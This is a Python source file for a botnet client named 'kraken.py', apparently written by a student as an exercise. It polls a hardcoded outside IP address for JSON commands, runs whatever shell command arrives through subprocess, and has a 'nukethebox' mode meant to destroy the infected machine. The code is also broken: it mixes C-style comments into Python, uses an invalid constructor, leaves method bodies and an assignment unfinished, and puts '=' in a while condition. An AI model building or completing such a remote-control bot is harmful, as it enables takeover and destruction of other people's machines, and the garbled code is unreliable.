#!/usr/bin/env python3
// Amanda Brown (aeb6590) 
// kraken.py (HTTP bot) 

import json
import requests
import subprocess
import time
from random import * 

PORT = 8080
EX = 0

class Bot:
    def _init_(self,uuid):
        self.uuid = getUUID()
 
    def getUUID():
        uuid = random() 
        return uuid

    def request():
        r = requests.get('http://127.0.0.1') 
        cmd = r.json()
        execution(cmd)

    def execution(cmd):
        command = cmd.split() 
        subprocess.run(command)
        // if execution is successful store in data to be sent 

    def response():


b = Bot(random())

# Execute a passed in shell command 
def shellExec(command): 
    subprocess.call(command)

# Execute the passed in nuke command
def nuke(command):
    subprocess.call(command)

# Figure the bot's sleep time
def sleepTime(ret):
    if ret == 200: 
        sleepTime = 3
    else: 
        sleepTime = 

# Execute the program
def main():
    while (EX = 0):
        cmd = requests.get('http://129.21.115.114:8080')
        parsedCmd = json.loads(cmd)
        
        # If server replies with shell execution command
        if parsedCmd.get("mode") == "shell":
            resp = shellExec(parsedCmd.get("params"))
        
        # If server replies with nuke the box command 
        if parsedCmd.get("mode") == "nukethebox": 
            resp = nuke(parsedCmd.get("params"))

        ret = requests.post('http://129.21.115.114:8080')

        TTS = sleepTime(ret.status_code) 
